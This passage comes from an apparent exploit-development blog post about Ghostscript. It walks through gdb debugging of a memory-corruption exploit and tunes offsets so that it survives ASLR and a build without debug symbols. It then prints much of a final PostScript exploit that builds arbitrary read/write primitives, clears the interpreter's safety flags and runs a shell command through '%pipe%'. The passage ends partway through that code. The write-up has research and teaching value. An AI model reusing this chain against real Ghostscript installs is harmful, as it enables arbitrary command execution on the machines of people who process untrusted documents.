</span></span><span class="line"><span class="cl"><span class="mi">958</span>     <span class="nf">gs_enable_free</span><span class="p">((</span><span class="kt">gs_memory_t</span> <span class="o">*</span><span class="p">)</span> <span class="n">mem</span><span class="p">,</span> <span class="nb">true</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">959</span> <span class="p">}</span>
</span></span></code></pre></div><p>This actually looks very similar with the same macro calls as the <code>gc_objects_clear_marks</code> function that I looked at earlier. This time, its going through all the objects in a clump and calling the <code>finalize</code> function on each object. Printing out the value of <code>finalize</code> on the line of the crash shows:</p>
<img src="./Images/finalize.jpg" alt="showing the value of finalize in gdb" style="display:block; margin:auto;">
<p>Since the string that is being printed is not in this function, it must be in the <code>default_subclass_finalize</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// /base/gdevsclass.c
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="mi">871</span> <span class="kt">void</span> <span class="nf">default_subclass_finalize</span><span class="p">(</span><span class="k">const</span> <span class="kt">gs_memory_t</span> <span class="o">*</span><span class="n">cmem</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">vptr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">872</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">873</span>     <span class="n">gx_device</span> <span class="o">*</span> <span class="k">const</span> <span class="n">dev</span> <span class="o">=</span> <span class="p">(</span><span class="n">gx_device</span> <span class="o">*</span><span class="p">)</span><span class="n">vptr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">874</span>     <span class="n">generic_subclass_data</span> <span class="o">*</span><span class="n">psubclass_data</span> <span class="o">=</span> <span class="p">(</span><span class="n">generic_subclass_data</span> <span class="o">*</span><span class="p">)</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">subclass_data</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">875</span>     <span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="n">cmem</span><span class="p">;</span> <span class="cm">/* unused */</span>
</span></span><span class="line"><span class="cl"><span class="mi">876</span> 
</span></span><span class="line"><span class="cl"><span class="mi">877</span>     <span class="nf">discard</span><span class="p">(</span><span class="nf">gs_closedevice</span><span class="p">(</span><span class="n">dev</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="mi">878</span> 
</span></span><span class="line"><span class="cl"><span class="mi">879</span>     <span class="k">if</span> <span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">finalize</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">880</span>         <span class="n">dev</span><span class="o">-&gt;</span><span class="nf">finalize</span><span class="p">(</span><span class="n">dev</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">881</span> 
</span></span><span class="line"><span class="cl"><span class="mi">882</span>     <span class="cm">/* The only way we should get here is when the original device
</span></span></span><span class="line"><span class="cl"><span class="cm">883      * should be freed (because the subclassing device is pretending
</span></span></span><span class="line"><span class="cl"><span class="cm">884      * to be the original device). That being the case, all the child
</span></span></span><span class="line"><span class="cl"><span class="cm">885      * devices should have a reference count of 1 (referenced only by
</span></span></span><span class="line"><span class="cl"><span class="cm">886      * their parent). Anything else is an error.
</span></span></span><span class="line"><span class="cl"><span class="cm">887      */</span>
</span></span><span class="line"><span class="cl"><span class="mi">888</span>     <span class="k">if</span> <span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">child</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">889</span>         <span class="k">if</span> <span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">child</span><span class="o">-&gt;</span><span class="n">rc</span><span class="p">.</span><span class="n">ref_count</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">890</span>             <span class="nf">dmprintf</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">memory</span><span class="p">,</span> <span class="s">&#34;Error: finalizing subclassing device while child refcount &gt; 1</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">891</span>             <span class="k">while</span> <span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">child</span><span class="o">-&gt;</span><span class="n">rc</span><span class="p">.</span><span class="n">ref_count</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">892</span>                 <span class="nf">rc_decrement_only</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">child</span><span class="p">,</span> <span class="s">&#34;de-reference child device&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">893</span>         <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mi">894</span>         <span class="nf">rc_decrement</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">child</span><span class="p">,</span> <span class="s">&#34;de-reference child device&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">895</span>     <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mi">896</span> 
</span></span><span class="line"><span class="cl"><span class="mi">897</span>     <span class="k">if</span> <span class="p">(</span><span class="n">psubclass_data</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="mi">898</span>         <span class="nf">gs_free_object</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">memory</span><span class="o">-&gt;</span><span class="n">non_gc_memory</span><span class="p">,</span> <span class="n">psubclass_data</span><span class="p">,</span> <span class="s">&#34;gx_epo_finalize(suclass data)&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">899</span>         <span class="n">dev</span><span class="o">-&gt;</span><span class="n">subclass_data</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="mi">900</span>     <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="mi">901</span>     <span class="k">if</span> <span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">stype_is_dynamic</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">902</span>         <span class="nf">gs_free_const_object</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">memory</span><span class="o">-&gt;</span><span class="n">non_gc_memory</span><span class="p">,</span> <span class="n">dev</span><span class="o">-&gt;</span><span class="n">stype</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="mi">903</span>                              <span class="s">&#34;default_subclass_finalize&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">904</span>     <span class="k">if</span> <span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">icc_struct</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">905</span>         <span class="nf">rc_decrement</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">icc_struct</span><span class="p">,</span> <span class="s">&#34;finalize subclass device&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">906</span>     <span class="k">if</span> <span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">PageList</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">907</span>         <span class="nf">rc_decrement</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">PageList</span><span class="p">,</span> <span class="s">&#34;finalize subclass device&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">908</span>     <span class="k">if</span> <span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">NupControl</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="mi">909</span>         <span class="nf">rc_decrement</span><span class="p">(</span><span class="n">dev</span><span class="o">-&gt;</span><span class="n">NupControl</span><span class="p">,</span> <span class="s">&#34;finalize subclass device&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="mi">910</span> <span class="p">}</span>
</span></span></code></pre></div><p>The string is printed on line 890 and the comment above even says that this is an error. The reason why this is happening is because the child device has a reference count greater than 1 which means that the child device is still being used by something else. This is not a problem with the exploit, its just Ghostscript&rsquo;s way of saying that the child device is still being used by something else and it can&rsquo;t finalize it yet. This is actually a really easy fix, all I need to do is find where <code>dev-&gt;child-&gt;rc.ref_count</code> is in memory and set the reference count to 1.</p>
<p>For some reason, gdb doesn&rsquo;t show the source code for <code>default_subclass_finalize</code> so I had to look at the disassembly. I see that line 877 calls <code>gs_closedevice</code> with <code>dev</code> as the argument and pwndbg shows me when the function is called as well as the address of the argument:</p>
<img src="./Images/addr_of_dev.jpg" alt="showing the address of dev in gdb" style="display:block; margin:auto;">
<p><code>dev</code> is a pointer to a <code>gx_device</code> struct which is very large and has many fields. For this reason, I will not show it but I will show the relevant fields:</p>
<img src="./Images/p_dev.jpg" alt="showing the output of 'p *$dev' in gdb" style="display:block; margin:auto;">
<p>The <code>child</code> field is a pointer to another <code>gx_device</code> struct and you can see that the <code>rc</code> struct is also there. Printing out the value of <code>dev-&gt;child-&gt;rc</code> shows:</p>
<img src="./Images/p_rc_struct.jpg" alt="showing the output of 'p *$dev->child->rc' in gdb" style="display:block; margin:auto;">
<p>Theres the issue, the reference count is <code>3</code> which is greater than <code>1</code>. Printing the address of <code>dev-&gt;child-&gt;rc</code> with no ASLR shows that its at address <code>0x555557aa1530</code>:</p>
<img src="./Images/addr_of_rc.jpg" alt="showing the address of dev->child->rc in gdb" style="display:block; margin:auto;">
<p>At this point, I start going back to the exploit code and looking at the values of the variables I created and looking to see if one of them was at a constant offset from <code>dev-&gt;child-&gt;rc</code>. It turns out that address <code>0x555557af8f30</code> is always at a constant offset of <code>0x57A00</code> from ``dev-&gt;child-&gt;rc`. I tested it with and without ASLR:</p>
<p><strong>Without ASLR:</strong>
<code>0x555557af8f30 - 0x555557aa1530 = 0x57A00</code></p>
<p><strong>With ASLR:</strong>
<code>0x56ed00b8af30 (buf4) - &amp;$dev-&gt;child-&gt;rc = 0x57A00</code></p>
<p><code>0x555557af8f30</code> is the address that I wrote to <code>ptr3</code> earlier in the exploit code so I can just use the variable <code>buf4</code> since it always holds that address. So now I can just subtract <code>0x57A00</code> from <code>buf4</code> to get the address of <code>dev-&gt;child-&gt;rc</code> and then write <code>1</code> to the <code>ref_count</code> field:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="nf">buf4</span> <span class="mf">-358912</span> <span class="nf">ptradd</span> <span class="p">&lt;</span><span class="mf">01</span><span class="p">&gt;</span> <span class="nf">arbwr</span>
</span></span></code></pre></div><p>Im not really sure why the refcount is increased when I set the memory back before the overflow since I had already changed everything back to what it was. I even looked at the hexdump after the overflow to see if there was a random 3 since <code>rc.ref_count</code> was always 3 but I couldn&rsquo;t find anything. Regardless, this fixes the error and now the exploit works with ASLR on:</p>
<img src="./Images/final_exploit.jpg" alt="showing the output of the exploit with ASLR on and no errors" style="display:block; margin:auto;">

<h2 class="relative group">Removing Debug Symbols 
    <div id="removing-debug-symbols" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#removing-debug-symbols" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<p>They only thing left I can think of is recompiling Ghostscript with debug symbols disabled to see if it still works. To be honest, I didn&rsquo;t have high hopes for it working without debug symbols just because there is no way that the offsets stay the same considering <code>-g3</code> provides no optimization. But I will try it anyway:</p>
<img src="./Images/final_exploit_no_debug.jpg" alt="showing the output of the exploit with ASLR on and no debug symbols" style="display:block; margin:auto;">
<p>Of coures it didn&rsquo;t work, and for the same reasons I thought it wouldn&rsquo;t. It took some time since I no longer had the source code to look at in gdb and I had to understand the optimized assembly that gcc generated. But I was able to figure out that the offsets two pointers needed to be changed.</p>
<ol>
<li>
<p><code>3408</code> in <code>/buf4 buf3 3408 ptradd def</code> needed to be changed to <code>512</code></p>
</li>
<li>
<p><code>-358912</code> in <code>buf4 -358912 ptradd &lt;01&gt; arbwr</code> needed to be changed to <code>-190688</code></p>
</li>
</ol>
<p>After changing these two offsets, the exploit works with ASLR on and no debug symbols:</p>
<img src="./Images/final_exploit_no_debug_fixed.jpg" alt="showing the output of the final exploit with ASLR on and no debug symbols" style="display:block; margin:auto;">
<p>And now there you have it, a working Ghostscript exploit with ASLR on that works without debug symbols as if it was a real world exploit! Though this Ghostscript binary was compiled from source, modifying the exploit to work with the prebuilt binary shouldn&rsquo;t be too hard. Ghostscript also allows users to specify what features they want to compile in, and modifying the exploit to work with those features should be easy as well as its most likely just a matter of changing the offsets in the exploit code.</p>
<p>Unfortunately, when I tried running the exploit in different ways such as changing the directory of the Postscript to be different than the current directory or even changing the name of the Postscript file, the exploit would segfault. One thing became clear when I was testing the exploit in different scenarios, the difference between the pointer at <code>0x7ffff3688010</code> changes compared to <code>0x7ffff3688018</code>. This seems to be the only thing that changes and as far as I could tell, there was no way of getting the pointer at <code>0x7ffff3688010</code>. Instead of subtracting an offset from the pointer at <code>0x7ffff3688018</code>, a better way would be trying to find a pointer in memory that contains the address at <code>0x7ffff3688010</code>. This way, the exploit can work without having to hardcode the offset. I tried searching for the pointer at <code>0x7ffff3688010</code> in gdb and I found only one reference to it but it changes slightly across different runs. The next best thing would be trying to find a pointer that changes with the pointer at <code>0x7ffff3688018</code> or is somehow correlated to it and is always at a constant offset from it. This would require more research and looking at the Ghostscript source code and the data structures it uses. So for now I will leave it at that.</p>

<h2 class="relative group">Final Exploit Code 
    <div id="final-exploit-code" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700 !no-underline" href="#final-exploit-code" aria-label="Anchor">#</a>
    </span>        
    
</h2>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-postscript" data-lang="postscript"><span class="line"><span class="cl"><span class="c1">% gs -q -sDEVICE=txtwrite -sOutputFile=/dev/null glyphunicode.ps
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="mf">500000000</span> <span class="nf">setvmthreshold</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/REFIDX</span> <span class="mf">249888</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/REFOFS</span> <span class="mf">3248640</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/STROBJ</span> <span class="mf">1000</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/ARROBJ</span> <span class="mf">6250</span> <span class="nf">array</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/OBJARR</span> <span class="mf">32</span> <span class="nf">array</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nf">OBJARR</span> <span class="mf">0</span> <span class="nf">STROBJ</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl"><span class="nf">OBJARR</span> <span class="mf">1</span> <span class="nf">ARROBJ</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl"><span class="nv">/TARGET</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/MAGIC</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/STRPTR</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl"><span class="nv">/ARRPTR</span> <span class="nf">null</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">% &lt;dststr&gt; &lt;dstidx&gt; &lt;srcstr&gt; &lt;srcidx&gt; &lt;length&gt; copystr -
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">/copystr</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_length</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_srcidx</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_srcstr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_dstidx</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_dststr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_length</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_dststr</span> <span class="nf">_dstidx</span> <span class="nf">_srcstr</span> <span class="nf">_srcidx</span> <span class="nf">get</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_srcidx</span> <span class="nf">_srcidx</span> <span class="mf">1</span> <span class="nf">add</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_dstidx</span> <span class="nf">_dstidx</span> <span class="mf">1</span> <span class="nf">add</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="nf">repeat</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">% &lt;string&gt; &lt;int&gt; ptradd &lt;string&gt;
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">/ptradd</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_inc</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_ptr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_new</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="mf">0</span> <span class="mf">1</span> <span class="mf">7</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_i</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_b</span> <span class="nf">_ptr</span> <span class="nf">_i</span> <span class="nf">get</span> <span class="nf">_inc</span> <span class="nf">add</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/_inc</span> <span class="nf">_b</span> <span class="mf">-8</span> <span class="nf">bitshift</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nf">_new</span> <span class="nf">_i</span> <span class="nf">_b</span> <span class="mf">255</span> <span class="nf">and</span> <span class="nf">put</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="nf">for</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_new</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">% &lt;string-address&gt; &lt;string-buffer&gt; arbrd -
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">/arbrd</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_buf</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_adr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">STRPTR</span> <span class="mf">0</span> <span class="nf">_adr</span> <span class="mf">0</span> <span class="mf">8</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl">    <span class="nf">_buf</span> <span class="mf">0</span> <span class="nf">OBJARR</span> <span class="mf">0</span> <span class="nf">get</span> <span class="mf">0</span> <span class="nf">_buf</span> <span class="nf">length</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">% &lt;string-address&gt; &lt;string-data&gt; arbwr -
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">/arbwr</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_buf</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/_adr</span> <span class="nf">exch</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">STRPTR</span> <span class="mf">0</span> <span class="nf">_adr</span> <span class="mf">0</span> <span class="mf">8</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl">    <span class="nf">OBJARR</span> <span class="mf">0</span> <span class="nf">get</span> <span class="mf">0</span> <span class="nf">_buf</span> <span class="mf">0</span> <span class="nf">_buf</span> <span class="nf">length</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="nf">bind</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">/DONE</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/MAGIC</span> <span class="nf">TARGET</span> <span class="nf">REFIDX</span> <span class="nf">get</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/STRPTR</span> <span class="nf">MAGIC</span> <span class="mf">8</span> <span class="mf">8</span> <span class="nf">getinterval</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/ARRPTR</span> <span class="nf">MAGIC</span> <span class="mf">24</span> <span class="mf">8</span> <span class="nf">getinterval</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s">(patch)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/arrptr</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">arrptr</span> <span class="mf">0</span> <span class="nf">ARRPTR</span> <span class="mf">0</span> <span class="mf">8</span> <span class="nf">copystr</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/arrsz</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">/next</span> <span class="nf">arrptr</span> <span class="mf">-40</span> <span class="nf">ptradd</span> <span class="mf">-48</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nf">next</span> <span class="mf">16</span> <span class="nf">ptradd</span> <span class="nf">arrsz</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">        <span class="nf">arrsz</span> <span class="p">&lt;</span><span class="nf">d886010000000000</span><span class="p">&gt;</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">exit</span> <span class="p">}</span> <span class="nf">if</span> <span class="c1">% 100056
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="nv">/next</span> <span class="nf">arrptr</span> <span class="mf">-56</span> <span class="nf">ptradd</span> <span class="mf">-48</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nf">next</span> <span class="mf">16</span> <span class="nf">ptradd</span> <span class="nf">arrsz</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">        <span class="nf">arrsz</span> <span class="p">&lt;</span><span class="nf">e886010000000000</span><span class="p">&gt;</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">exit</span> <span class="p">}</span> <span class="nf">if</span> <span class="c1">% 100072
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="s">(unknown header layout)</span> <span class="nf">=</span> <span class="nf">quit</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="nf">loop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/head</span> <span class="nf">next</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">/next</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cname</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/cname_str</span> <span class="mf">21</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">head</span> <span class="nf">next</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">        <span class="nf">head</span> <span class="mf">32</span> <span class="nf">ptradd</span> <span class="nf">cname</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">        <span class="nf">cname</span> <span class="nf">cname_str</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">cname_str</span> <span class="s">(gs_lib_ctx_init(core))</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">exit</span> <span class="p">}</span> <span class="nf">if</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="nf">loop</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/buf</span> <span class="mf">4</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr1</span> <span class="nf">head</span> <span class="mf">188</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr2</span> <span class="nf">head</span> <span class="mf">204</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr1</span> <span class="nf">buf</span> <span class="nf">arbrd</span> <span class="nf">buf</span> <span class="p">&lt;</span><span class="mf">01000000</span><span class="p">&gt;</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">ptr1</span> <span class="p">&lt;</span><span class="mf">00000000</span><span class="p">&gt;</span> <span class="nf">arbwr</span> <span class="p">}</span> <span class="nf">if</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr2</span> <span class="nf">buf</span> <span class="nf">arbrd</span> <span class="nf">buf</span> <span class="p">&lt;</span><span class="mf">01000000</span><span class="p">&gt;</span> <span class="nf">eq</span> <span class="p">{</span> <span class="nf">ptr2</span> <span class="p">&lt;</span><span class="mf">00000000</span><span class="p">&gt;</span> <span class="nf">arbwr</span> <span class="p">}</span> <span class="nf">if</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s">(exec)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl">    <span class="s">(%pipe%ls)</span> <span class="s">(w)</span> <span class="nf">file</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="s">(done)</span> <span class="nf">=</span> <span class="nf">flush</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/head</span> <span class="nf">next</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">head</span> <span class="nf">next</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr3</span> <span class="nf">next</span> <span class="mf">-56</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nv">/buf2</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="mf">8</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nf">ptr3</span> <span class="nf">buf2</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">        <span class="nv">/ptr3</span> <span class="nf">buf2</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="nf">repeat</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/ptr4</span> <span class="nf">ptr3</span> <span class="mf">8</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/buf3</span> <span class="mf">8</span> <span class="nf">string</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">    <span class="nf">ptr4</span> <span class="nf">buf3</span> <span class="nf">arbrd</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">/buf4</span> <span class="nf">buf3</span> <span class="mf">512</span> <span class="nf">ptradd</span> <span class="nf">def</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nf">ptr3</span> <span class="nf">buf4</span> <span class="nf">arbwr</span>
</span></span><span class="line"><span class="cl">
